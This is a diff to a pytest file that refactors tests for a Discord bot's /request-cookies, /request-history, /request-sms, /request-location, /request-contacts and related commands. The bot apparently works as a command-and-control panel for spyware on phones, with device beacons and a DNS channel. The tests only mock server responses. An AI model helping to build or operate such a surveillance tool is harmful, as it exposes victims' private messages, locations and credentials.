@@ -1,6 +1,7 @@
 """Tests for the Discord bot slash commands, access control, and logging."""
 
 import sys
+from typing import Any
 from unittest.mock import AsyncMock, MagicMock, patch
 
 import pytest
@@ -39,15 +40,20 @@ import bot as bot_module  # noqa: E402
 
 show_devices = bot_module.show_devices.callback  # type: ignore[union-attr]
 set_beacon_interval = bot_module.set_beacon_interval.callback  # type: ignore[union-attr]
-request_cookies = bot_module.request_cookies.callback  # type: ignore[union-attr]
 set_communication_protocol = bot_module.set_communication_protocol.callback  # type: ignore[union-attr]
-request_history = bot_module.request_history.callback  # type: ignore[union-attr]
-request_bookmarks = bot_module.request_bookmarks.callback  # type: ignore[union-attr]
-request_sms = bot_module.request_sms.callback  # type: ignore[union-attr]
-request_location = bot_module.request_location.callback  # type: ignore[union-attr]
-request_contacts = bot_module.request_contacts.callback  # type: ignore[union-attr]
 show_results = bot_module.show_results.callback  # type: ignore[union-attr]
 send_message = bot_module.send_message.callback  # type: ignore[union-attr]
+
+# All /request-* commands share the same signature (interaction, device="*"),
+# so their core behaviour can be verified with a single parametrized class.
+_REQUEST_COMMANDS = [
+    ("request-cookies", bot_module.request_cookies.callback),
+    ("request-history", bot_module.request_history.callback),
+    ("request-bookmarks", bot_module.request_bookmarks.callback),
+    ("request-sms", bot_module.request_sms.callback),
+    ("request-location", bot_module.request_location.callback),
+    ("request-contacts", bot_module.request_contacts.callback),
+]
 
 
 # ---------------------------------------------------------------------------
@@ -404,49 +410,51 @@ class TestSetBeaconIntervalCommand:
         assert "Access denied" in sent_text
 
 
-class TestRequestCookiesCommand:
-    """Tests for the /request-cookies slash command."""
+@pytest.mark.parametrize("task_type,command_fn", _REQUEST_COMMANDS)
+class TestRequestCommands:
+    """Parametrized tests covering all six /request-* slash commands.
+
+    Each command shares identical access-control and server-bridge behaviour;
+    only the task_type string and cached output differ between them.
+    """
 
     @pytest.mark.asyncio
-    async def test_non_admin_gets_denied(self) -> None:
+    async def test_non_admin_gets_denied(self, task_type: str, command_fn: Any) -> None:
         interaction = _make_interaction(author_id=999)
-        await request_cookies(interaction)
-        sent_text = _get_sent_text(interaction)
-        assert "Access denied" in sent_text
+        await command_fn(interaction)
+        assert "Access denied" in _get_sent_text(interaction)
 
     @pytest.mark.asyncio
-    async def test_shows_cached_data_and_queue_confirmation(self) -> None:
+    async def test_shows_cached_and_queues(self, task_type: str, command_fn: Any) -> None:
         interaction = _make_interaction()
-        with patch("bot.call_server", side_effect=_make_request_mock("request-cookies", with_cached_data=True)):
-            await request_cookies(interaction)
+        with patch("bot.call_server", side_effect=_make_request_mock(task_type, with_cached_data=True)):
+            await command_fn(interaction)
         sent_text = _get_sent_text(interaction)
-        assert "cached output for request-cookies" in sent_text
+        assert f"cached output for {task_type}" in sent_text
         assert "📡" in sent_text
 
     @pytest.mark.asyncio
-    async def test_no_cached_data_shows_empty_and_queue(self) -> None:
+    async def test_no_cached_data_shows_empty_message(self, task_type: str, command_fn: Any) -> None:
         interaction = _make_interaction()
-        with patch("bot.call_server", side_effect=_make_request_mock("request-cookies")):
-            await request_cookies(interaction)
+        with patch("bot.call_server", side_effect=_make_request_mock(task_type)):
+            await command_fn(interaction)
         sent_text = _get_sent_text(interaction)
         assert "No cached data" in sent_text
         assert "📡" in sent_text
 
     @pytest.mark.asyncio
-    async def test_server_unreachable_shows_error(self) -> None:
+    async def test_server_unreachable_shows_error(self, task_type: str, command_fn: Any) -> None:
         interaction = _make_interaction()
         with patch("bot.call_server", return_value=None):
-            await request_cookies(interaction)
-        sent_text = _get_sent_text(interaction)
-        assert "unreachable" in sent_text.lower()
+            await command_fn(interaction)
+        assert "unreachable" in _get_sent_text(interaction).lower()
 
     @pytest.mark.asyncio
-    async def test_specific_device_included_in_footer(self) -> None:
+    async def test_specific_device_included_in_result(self, task_type: str, command_fn: Any) -> None:
         interaction = _make_interaction()
-        with patch("bot.call_server", side_effect=_make_request_mock("request-cookies")):
-            await request_cookies(interaction, device="POCO_F5")
-        sent_text = _get_sent_text(interaction)
-        assert "POCO_F5" in sent_text
+        with patch("bot.call_server", side_effect=_make_request_mock(task_type)):
+            await command_fn(interaction, device="POCO_F5")
+        assert "POCO_F5" in _get_sent_text(interaction)
 
 
 class TestSetCommunicationProtocolCommand:
@@ -475,162 +483,6 @@ class TestSetCommunicationProtocolCommand:
         await set_communication_protocol(interaction, "dns")
         sent_text = _get_sent_text(interaction)
         assert "Access denied" in sent_text
-
-
-class TestRequestHistoryCommand:
-    """Tests for the /request-history slash command."""
-
-    @pytest.mark.asyncio
-    async def test_non_admin_gets_denied(self) -> None:
-        interaction = _make_interaction(author_id=999)
-        await request_history(interaction)
-        sent_text = _get_sent_text(interaction)
-        assert "Access denied" in sent_text
-
-    @pytest.mark.asyncio
-    async def test_shows_cached_and_queues(self) -> None:
-        interaction = _make_interaction()
-        with patch("bot.call_server", side_effect=_make_request_mock("request-history", with_cached_data=True)):
-            await request_history(interaction)
-        sent_text = _get_sent_text(interaction)
-        assert "cached output for request-history" in sent_text
-        assert "📡" in sent_text
-
-    @pytest.mark.asyncio
-    async def test_server_unreachable_shows_error(self) -> None:
-        interaction = _make_interaction()
-        with patch("bot.call_server", return_value=None):
-            await request_history(interaction)
-        sent_text = _get_sent_text(interaction)
-        assert "unreachable" in sent_text.lower()
-
-    @pytest.mark.asyncio
-    async def test_specific_device_in_footer(self) -> None:
-        interaction = _make_interaction()
-        with patch("bot.call_server", side_effect=_make_request_mock("request-history")):
-            await request_history(interaction, device="POCO_F5")
-        sent_text = _get_sent_text(interaction)
-        assert "POCO_F5" in sent_text
-
-
-class TestRequestBookmarksCommand:
-    """Tests for the /request-bookmarks slash command."""
-
-    @pytest.mark.asyncio
-    async def test_non_admin_gets_denied(self) -> None:
-        interaction = _make_interaction(author_id=999)
-        await request_bookmarks(interaction)
-        sent_text = _get_sent_text(interaction)
-        assert "Access denied" in sent_text
-
-    @pytest.mark.asyncio
-    async def test_shows_cached_and_queues(self) -> None:
-        interaction = _make_interaction()
-        with patch("bot.call_server", side_effect=_make_request_mock("request-bookmarks", with_cached_data=True)):
-            await request_bookmarks(interaction)
-        sent_text = _get_sent_text(interaction)
-        assert "cached output for request-bookmarks" in sent_text
-        assert "📡" in sent_text
-
-    @pytest.mark.asyncio
-    async def test_server_unreachable_shows_error(self) -> None:
-        interaction = _make_interaction()
-        with patch("bot.call_server", return_value=None):
-            await request_bookmarks(interaction)
-        sent_text = _get_sent_text(interaction)
-        assert "unreachable" in sent_text.lower()
-
-    @pytest.mark.asyncio
-    async def test_specific_device_in_footer(self) -> None:
-        interaction = _make_interaction()
-        with patch("bot.call_server", side_effect=_make_request_mock("request-bookmarks")):
-            await request_bookmarks(interaction, device="POCO_F5")
-        sent_text = _get_sent_text(interaction)
-        assert "POCO_F5" in sent_text
-
-
-class TestRequestSmsCommand:
-    """Tests for the /request-sms slash command."""
-
-    @pytest.mark.asyncio
-    async def test_non_admin_gets_denied(self) -> None:
-        interaction = _make_interaction(author_id=999)
-        await request_sms(interaction)
-        sent_text = _get_sent_text(interaction)
-        assert "Access denied" in sent_text
-
-    @pytest.mark.asyncio
-    async def test_shows_cached_and_queues(self) -> None:
-        interaction = _make_interaction()
-        with patch("bot.call_server", side_effect=_make_request_mock("request-sms", with_cached_data=True)):
-            await request_sms(interaction)
-        sent_text = _get_sent_text(interaction)
-        assert "cached output for request-sms" in sent_text
-        assert "📡" in sent_text
-
-    @pytest.mark.asyncio
-    async def test_server_unreachable_shows_error(self) -> None:
-        interaction = _make_interaction()
-        with patch("bot.call_server", return_value=None):
-            await request_sms(interaction)
-        sent_text = _get_sent_text(interaction)
-        assert "unreachable" in sent_text.lower()
-
-
-class TestRequestLocationCommand:
-    """Tests for the /request-location slash command."""
-
-    @pytest.mark.asyncio
-    async def test_non_admin_gets_denied(self) -> None:
-        interaction = _make_interaction(author_id=999)
-        await request_location(interaction)
-        sent_text = _get_sent_text(interaction)
-        assert "Access denied" in sent_text
-
-    @pytest.mark.asyncio
-    async def test_shows_cached_and_queues(self) -> None:
-        interaction = _make_interaction()
-        with patch("bot.call_server", side_effect=_make_request_mock("request-location", with_cached_data=True)):
-            await request_location(interaction)
-        sent_text = _get_sent_text(interaction)
-        assert "cached output for request-location" in sent_text
-        assert "📡" in sent_text
-
-    @pytest.mark.asyncio
-    async def test_server_unreachable_shows_error(self) -> None:
-        interaction = _make_interaction()
-        with patch("bot.call_server", return_value=None):
-            await request_location(interaction)
-        sent_text = _get_sent_text(interaction)
-        assert "unreachable" in sent_text.lower()
-
-
-class TestRequestContactsCommand:
-    """Tests for the /request-contacts slash command."""
-
-    @pytest.mark.asyncio
-    async def test_non_admin_gets_denied(self) -> None:
-        interaction = _make_interaction(author_id=999)
-        await request_contacts(interaction)
-        sent_text = _get_sent_text(interaction)
-        assert "Access denied" in sent_text
-
-    @pytest.mark.asyncio
-    async def test_shows_cached_and_queues(self) -> None:
-        interaction = _make_interaction()
-        with patch("bot.call_server", side_effect=_make_request_mock("request-contacts", with_cached_data=True)):
-            await request_contacts(interaction)
-        sent_text = _get_sent_text(interaction)
-        assert "cached output for request-contacts" in sent_text
-        assert "📡" in sent_text
-
-    @pytest.mark.asyncio
-    async def test_server_unreachable_shows_error(self) -> None:
-        interaction = _make_interaction()
-        with patch("bot.call_server", return_value=None):
-            await request_contacts(interaction)
-        sent_text = _get_sent_text(interaction)
-        assert "unreachable" in sent_text.lower()
 
 
 class TestSendMessageCommand:
